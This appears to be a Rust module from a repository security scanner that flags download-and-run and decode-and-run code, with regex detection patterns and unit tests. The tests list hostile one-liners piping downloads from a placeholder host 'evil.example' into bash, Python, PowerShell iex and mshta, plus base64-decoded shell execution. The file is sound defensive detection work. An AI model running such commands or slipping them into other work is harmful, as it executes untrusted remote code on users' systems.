//! Looks for code that behaves dangerously: running what it downloads, or
//! running what it decodes.
//!
//! These read text patterns and don't understand the code, so an honest install
//! script can match too. That is intended: downloading and running code is risky
//! whoever does it, and the report describes the behavior without calling it
//! malware.

use crate::git::RepoFile;
use crate::network::{
    CALL, DECODE, FileClass, LineCounter, classify, is_binary, nearby_lines, surrounding_line,
};
use crate::report::{At, Kind, Report};
use crate::text::Untrusted;
use regex::bytes::Regex;
use std::sync::LazyLock;

/// A download handed straight to something that runs it.
const PIPED_DOWNLOAD_PATTERN: &str = r#"(?xi-u)
    \b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)\b [^\n|]{0,400}
        \| \s* (?:sudo\s+(?:-\w+\s+)*)?
        (?:(?:ba|z|da|k|c|fi)?sh|python[0-9.]*|node|perl|ruby|php|iex|invoke-expression
           |cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh)\b
  | \b(?:ba|z|da)?sh \s+ (?:-c\s+)? ["']? \$\( \s* (?:curl|wget)\b
  | \b(?:ba|z|da)?sh \s+ <\( \s* (?:curl|wget)\b
  | \b(?:iex|invoke-expression) [\s(]*
        (?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)
  | \bdownloadstring \s* \( [^\n]{0,300} \) \s* \| \s* iex\b
  | \bmshta \s+ https?:
"#;

/// Encoded text decoded and handed straight to a shell.
const PIPED_DECODE_PATTERN: &str = r"(?xi-u)
    \b(?:base64\s+(?:-d|-D|--decode)|xxd\s+-r) [^\n|]{0,200}
        \| \s* (?:sudo\s+)? (?:ba|z|da)?sh\b
";

/// Things that run a string as code. Calls on other objects, such as PyTorch's
/// `model.eval()`, are skipped by requiring no dot before the name.
const RUNS_TEXT_PATTERN: &str = r#"(?mxi-u)
    (?:^|[^.\w$\n]) eval \s* \( \s* [^)\s]
  | \b(?:window|globalthis|global|self)\.eval \s* \( \s* [^)\s]
  | \bnew \s+ function \s* \(
  | (?:^|[^.\w$\n]) function \s* \( \s* ["'][^"']{0,40}["'] \s* ,
  | \bvm\.(?:runinthiscontext|runinnewcontext|runincontext|script) \s* \(
  | \bmodule\._compile \s* \(
  | (?:^|[^.\w$\n]) exec \s* \( \s* [^)\s]
  | (?:^|[^.\w$\n]) execscript \s* \(
"#;

static PIPED_DOWNLOAD: LazyLock<Regex> = LazyLock::new(|| compile(PIPED_DOWNLOAD_PATTERN));
static PIPED_DECODE: LazyLock<Regex> = LazyLock::new(|| compile(PIPED_DECODE_PATTERN));
static RUNS_TEXT: LazyLock<Regex> = LazyLock::new(|| compile(RUNS_TEXT_PATTERN));

fn compile(pattern: &str) -> Regex {
    Regex::new(pattern).expect("patterns are constants covered by tests")
}

/// How far from a `run this text` call to look for the download it runs. Often a
/// few lines apart, as in `const res = await fetch(u); eval(await res.text())`.
const NEARBY_LINES: usize = 12;
const NEARBY_WINDOW_BYTES: usize = 1200;

/// Records dangerous behavior in a file. Documentation is skipped, because an
/// install command in a README isn't running anything.
pub fn scan(file: &RepoFile, report: &mut Report) {
    if classify(file.path.raw()) != FileClass::Code || is_binary(&file.contents) {
        return;
    }

    add_matches(file, &PIPED_DOWNLOAD, Kind::DownloadsAndRuns, report);
    add_matches(file, &PIPED_DECODE, Kind::RunsHiddenCode, report);
    scan_text_runners(file, report);
}

fn add_matches(file: &RepoFile, pattern: &Regex, kind: Kind, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for found in pattern.find_iter(contents) {
        let snippet = snippet(contents, found.start(), found.end());
        let line = lines.line_at(found.start());
        report.add(
            kind,
            "",
            snippet.raw(),
            Some(At {
                path: &file.path,
                line,
            }),
        );
    }
}

fn scan_text_runners(file: &RepoFile, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for found in RUNS_TEXT.find_iter(contents) {
        if is_harmless_function_constructor(&contents[found.end()..]) {
            continue;
        }

        let same_line = surrounding_line(contents, found.start(), found.end());
        let nearby = nearby_lines(
            contents,
            found.start(),
            found.end(),
            NEARBY_LINES,
            NEARBY_WINDOW_BYTES,
        );
        let decodes = DECODE.is_match(same_line);
        let downloads = CALL.is_match(nearby);
        if !decodes && !downloads {
            continue;
        }

        let snippet = snippet(contents, found.start(), found.end());
        let line = lines.line_at(found.start());
        let at = Some(At {
            path: &file.path,
            line,
        });
        if decodes {
            report.add(Kind::RunsHiddenCode, "", snippet.raw(), at);
        }
        if downloads {
            report.add(Kind::DownloadsAndRuns, "", snippet.raw(), at);
        }
    }
}

/// `new Function("return this")` is a standard way to reach the global object,
/// and bundled libraries are full of it.
fn is_harmless_function_constructor(after_call: &[u8]) -> bool {
    let rest = after_call.trim_ascii_start();
    rest.starts_with(b"\"return this") || rest.starts_with(b"'return this")
}

fn snippet(contents: &[u8], start: usize, end: usize) -> Untrusted {
    Untrusted::from_bytes(surrounding_line(contents, start, end).trim_ascii())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan_text(path: &str, contents: &[u8]) -> Report {
        let file = RepoFile {
            path: Untrusted::from_bytes(path.as_bytes()),
            contents: contents.to_vec(),
        };
        let mut report = Report::new();
        scan(&file, &mut report);
        report
    }

    #[test]
    fn finds_downloads_piped_into_something_that_runs_them() {
        for line in [
            "curl -fsSL https://evil.example/i.sh | sh",
            "curl https://evil.example/i.sh | bash",
            "curl https://evil.example/i.sh | sudo bash",
            "curl https://evil.example/i.sh | sudo -E bash",
            "wget -qO- https://evil.example/i.sh | sh",
            "curl \"$PAYLOAD_URL\" | sh",
            "curl -s evil.example/x.py | python3",
            "curl -s evil.example/x.js | node",
            "bash <(curl -s https://evil.example/i.sh)",
            "sh -c \"$(curl -fsSL https://evil.example/i.sh)\"",
            "iwr https://evil.example/i.ps1 | iex",
            "irm https://evil.example/i.ps1 | iex",
            "iex (iwr https://evil.example/i.ps1)",
            "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://evil.example/i')",
            "(New-Object Net.WebClient).DownloadString('https://evil.example/i') | iex",
            "mshta https://evil.example/x.hta",
        ] {
            let report = scan_text("install.sh", line.as_bytes());

            assert_eq!(
                report.listed(Kind::DownloadsAndRuns).len(),
                1,
                "input: {line}"
            );
        }
    }

    #[test]
    fn downloading_without_running_is_not_flagged_here() {
        for line in [
            "curl -fsSL https://example.com/data.json -o data.json",
            "wget https://example.com/archive.tar.gz",
            "curl https://example.com/a | jq .name",
            "curl https://example.com/a | grep sh",
        ] {
            let report = scan_text("fetch-data.sh", line.as_bytes());

            assert!(
                report.listed(Kind::DownloadsAndRuns).is_empty(),
                "input: {line}"
            );
        }
    }

    #[test]
    fn finds_code_that_runs_what_it_downloads() {
        for (name, text) in [
            (
                "same line",
                "fetch(u).then(r => r.text()).then(t => eval(t))",
            ),
            (
                "a few lines apart",
                "const res = await axios.get(u);\nconst code = res.data;\neval(code);",
            ),
            (
                "function constructor",
                "const r = await axios.get(u);\nnew Function('require', r.data)(require);",
            ),
            ("python", "exec(requests.get(u).text)"),
            (
                "vm module",
                "const r = await fetch(u);\nvm.runInThisContext(await r.text());",
            ),
        ] {
            let report = scan_text("a.js", text.as_bytes());

            assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1, "{name}");
        }
    }

    #[test]
    fn finds_code_that_runs_what_it_decodes() {
        for line in [
            "eval(atob('aGk='))",
            "eval(Buffer.from(x, 'base64').toString())",
            "new Function(atob(x))()",
            "exec(base64.b64decode(blob))",
            "eval(base64_decode($x));",
            "eval(gzinflate(base64_decode($x)));",
            "exec(zlib.decompress(blob))",
            "echo aGk= | base64 -d | sh",
            "echo aGk= | base64 --decode | bash",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert_eq!(
                report.listed(Kind::RunsHiddenCode).len(),
                1,
                "input: {line}"
            );
        }
    }

    #[test]
    fn running_text_with_no_download_or_decoding_is_not_flagged() {
        for line in [
            "eval(expression)",
            "new Function('a', 'return a + 1')",
            "exec('git status')",
            "exec(command, callback)",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
            assert!(report.listed(Kind::RunsHiddenCode).is_empty(), "{line}");
        }
    }

    #[test]
    fn method_calls_that_share_these_names_are_not_flagged() {
        for line in [
            "model.eval()\nresponse = requests.get(url)",
            "const m = /x/.exec(text); fetch(url)",
            "page.eval(x); fetch(url)",
            "new Function(\"return this\")(); fetch(url)",
        ] {
            let report = scan_text("a.py", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn a_download_far_away_does_not_count() {
        let padding = "// filler\n".repeat(NEARBY_LINES + 2);
        let text = format!("const r = fetch(u);\n{padding}eval(code);");
        let report = scan_text("a.js", text.as_bytes());

        assert!(report.listed(Kind::DownloadsAndRuns).is_empty());
    }

    #[test]
    fn a_call_far_away_on_a_long_minified_line_does_not_count() {
        let padding = "x".repeat(NEARBY_WINDOW_BYTES * 2);
        let text = format!("fetch(u);{padding};eval(code);");
        let report = scan_text("a.min.js", text.as_bytes());

        assert!(report.listed(Kind::DownloadsAndRuns).is_empty());
    }

    #[test]
    fn ci_config_and_container_builds_are_not_flagged() {
        for path in [".gitlab-ci.yml", ".github/workflows/a.yml", "Dockerfile"] {
            let report = scan_text(
                path,
                b"curl https://a.example | sh
",
            );

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{path}");
        }
    }

    #[test]
    fn documentation_is_not_flagged() {
        let report = scan_text("README.md", b"Install: curl -fsSL https://a.example | sh\n");

        assert!(report.listed(Kind::DownloadsAndRuns).is_empty());
    }

    #[test]
    fn binary_files_are_not_searched() {
        let report = scan_text("tool.bin", b"\0\0curl https://a.example | sh");

        assert!(report.listed(Kind::DownloadsAndRuns).is_empty());
    }

    #[test]
    fn reports_the_right_line() {
        let snippet = "curl https://a.example/i | sh";
        let report = scan_text("a.sh", format!("#!/bin/sh\n\n{snippet}\n").as_bytes());

        assert_eq!(report.first_line(Kind::DownloadsAndRuns, snippet), Some(3));
    }
}
